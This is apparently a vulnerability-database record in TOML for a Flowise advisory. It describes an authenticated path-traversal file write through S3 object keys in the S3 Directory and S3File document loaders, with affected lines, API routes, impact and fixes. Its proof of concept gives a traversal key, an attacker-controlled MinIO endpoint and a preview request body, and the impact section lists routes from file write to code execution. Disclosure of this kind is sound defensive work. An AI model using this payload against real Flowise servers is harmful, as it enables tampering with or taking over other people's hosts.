@@ -1,0 +1,131 @@
+[id]
+ave_id = "AVE-2026-1433"
+aliases = ["GHSA-88pr-878c-24wf"]
+
+[basic]
+title = "Flowise: Authenticated arbitrary file write in the `S3 Directory` document loader via unsanitized S3 object keys                                                                                                  "
+description = "## Summary                                                                                                                                                                                                   
+                                          
+  Flowise on current `main` allows an authenticated user with
+  `documentStores:preview-process` permission to trigger the `S3 Directory`                                                                                                                                    
+  document loader with attacker-controlled S3 object keys. The loader joins
+  each returned S3 key with a temporary directory using `path.join(tempDir, key)`                                                                                                                              
+  and writes the object bytes to disk **without validating traversal sequences
+  such as `../`**. Cleanup later removes only the original temporary directory,
+  so files written outside that directory persist on the host filesystem.                                                                                                                                      
+                                                                                                                                                                                                               
+  This yields **arbitrary file write** with the privileges of the Flowise                                                                                                                                      
+  server process.                                                                                                                                                                                              
+                                                                                                                                                                                                               
+  A related variant exists in the `S3File` loader when                                                                                                                                                         
+  `fileProcessingMethod = unstructured` (same root cause; its cleanup behavior                                                                                                                                 
+  turns it into a mixed arbitrary write/delete/DoS primitive).                                                                                                                                     
+                                                                                                                                                                                                               
+  ## Affected component                                                                                                                                                                                        
+                                                                                                                                                                                                               
+  - `packages/components/nodes/documentloaders/S3Directory/S3Directory.ts`
+    - line **191**: `filePath = path.join(tempDir, key)` (unsanitized)                                                                                                                                         
+    - line **213**: recursive `mkdirSync` creates parent path                                                                                                                                                  
+    - line **216**: `writeFileSync` writes attacker-controlled bytes                                                                                                                                           
+    - line **289**: cleanup only removes the original `tempDir`, so escaped                                                                                                                                    
+      files remain on disk                                                                                                                                                                                     
+  - Related (variant):                                                                                                                                                                                         
+    `packages/components/nodes/documentloaders/S3File/S3File.ts`                                                                                                                                               
+    (lines 756, 780, 782, 817 — arbitrary write + recursive dirname delete)
+                                                                                                                                                                                                               
+  ## Reachability                                                                                                                                                                                              
+                                                                                                                                                                                                               
+  - Routes exposed:                                                                                                                                                                                            
+    `packages/server/src/routes/documentstore/index.ts:41,45`                                                                                                                                                  
+    (`/api/v1/document-store/loader/preview`,                                                                                                                                                                  
+     `/api/v1/document-store/loader/process/:loaderId`)                                                                                                                                                        
+  - Both require `documentStores:preview-process`                                                                                                                                                              
+  - `packages/server/src/services/documentstore/index.ts:588` passes                                                                                                                                           
+    `data.loaderConfig` straight to the loader node **with no path                                                                                                                                             
+    sanitization**                                                                                                                                                                                             
+  - `S3Directory` accepts a custom `serverUrl`, so the attacker does **not
+    need access to an existing trusted AWS bucket** — they can point Flowise                                                                                                                                   
+    at a local MinIO or any S3-compatible endpoint they control                                                                                                                                                
+                                                                                                                                                                                                               
+  ## Impact                                                                                                                                                                                                    
+                                                                                                                                                                                                               
+  - Authenticated arbitrary file write to any path writable by the Flowise                                                                                                                                     
+    process                                                                                                                                                                                                    
+  - Destructive overwrite of application data, secrets, or configuration                                                                                                                                       
+  - Deployment-dependent lift to RCE if the service account can modify                                                                                                                                         
+    executable, startup, or interpreter-loaded files                                                                                                                                                           
+    (e.g. `.bashrc`, systemd units, cron files, `require.resolve` targets,                                                                                                                                     
+    `package.json` postinstall scripts). This is not guaranteed                                                                                                                                                
+    product-wide.                         
+                                                                                                                                                                                                               
+  ## Preconditions                                                                                                                                                                                             
+                                                                                                                                                                                                               
+  - Flowise instance running (HTTP server mode)                                                                                                                                                                
+  - Attacker has a workspace account with the                                                                                                                                                                  
+    `documentStores:preview-process` role                                                                                                                                                                      
+  - No additional infrastructure required — `serverUrl` can point to                                                                                                                                           
+    attacker-controlled S3-compatible endpoint                                                                                                                                                                 
+                                                                                                                                                                                                               
+  ## Proof of Concept                                                                                                                                                                                          
+                                                             
+  1. Authenticate as a user with `documentStores:preview-process`
+  2. Run an S3-compatible server the attacker controls (e.g. MinIO)                                                                                                                                            
+  3. Create an object with a traversal key such as:                                                                                                                                                            
+     `../../../../tmp/flowise-poc.txt`                                                                                                                                                                         
+  4. Trigger:                                                                                                                                                                                                  
+     POST /api/v1/document-store/loader/preview                                                                                                                                                                
+     (or /api/v1/document-store/loader/process/:loaderId)    
+     body: {                                                                                                                                                                                                   
+       \"loaderId\": \"s3Directory\",         
+       \"loaderConfig\": {                                                                                                                                                                                       
+         \"serverUrl\": \"http://attacker-minio:9000\",                                                                                                                                                            
+         \"bucketName\": \"attacker-bucket\",                                                                                                                                                                      
+         \"prefix\": \"\",                                                                                                                                                                                         
+         \"credential\": \"\"                                    
+       }                                                                                                                                                                                                       
+     }                                                       
+  5. Observe that Flowise writes the object bytes to the escaped path                                                                                                                                          
+  6. Observe that cleanup removes only the original temp directory; the
+  escaped file persists                                                                                                                                                                                        
+                                                                                                                                                                                                               
+  Local reproduction confirmed: writing a key containing     
+  `../../escape-target/poc.txt` from a nested temp root created the file                                                                                                                                       
+  outside the temp directory, and the cleanup removed only `tempDir`.   
+                                                                                                                                                                                                               
+  ## Root Cause                                                                                                                                                                                                
+                                                             
+  The loader trusts S3 object keys as safe local relative paths. It should                                                                                                                                     
+  canonicalize the destination with `path.resolve(...)`, verify the resolved                                                                                                                                   
+  path remains within the intended temp directory, and reject traversal or                                                                                                                                     
+  absolute-path patterns before any directory creation or file write.                                                                                                                                          
+                                                                                                                                                                                                               
+  ## Suggested Remediation                                                                                                                                                                                     
+                                                                                                                                                                                                               
+  The repository already has shared path validators that are not used here:                                                                                                                                    
+                                                                                                                                                                                                               
+  - `packages/components/src/validator.ts:35` defines traversal checks
+  - `packages/components/src/validator.ts:295` defines `sanitizeFileName`                                                                                                                                      
+                                                                                                                                                                                                               
+  Recommended fix:                                                                                                                                                                                             
+                                                                                                                                                                                                               
+  1. Replace `path.join(tempDir, key)` with a resolve-and-verify flow                                                                                                                                          
+  2. Reject any resolved path outside `tempDir`                                                                                                                                                                
+  3. Prefer a sanitized basename if directory structure is not required
+  4. Apply the same fix to the `S3File` loader (`fileProcessingMethod = unstructured` branch)"
+severity = "HIGH"
+score = 5
+sources = ["ghsa"]
+published = ""
+updated = ""
+remediation = "请参考官方安全公告，及时安装安全更新或升级到最新版本。"
+
+[references]
+urls = []
+
+[exploit]
+poc_urls = []
+exp_urls = []
+
+[meta]
+status = "completed"
+collected_at = "2026-08-08T10:55:20.287682319+00:00"
